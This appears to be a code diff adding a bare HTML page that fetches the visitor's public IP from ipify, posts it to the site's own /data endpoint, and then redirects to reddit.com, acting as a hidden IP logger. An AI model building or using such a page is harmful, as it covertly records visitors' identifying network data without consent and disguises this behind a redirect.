@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+    <script>
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+        $.ajax("/data?ip=" + data.ip, {
+          success: function(data) {
+            window.location.replace("http://reddit.com");
+          }
+        });
+    })
+    </script>
+  </head>
+</html>
+
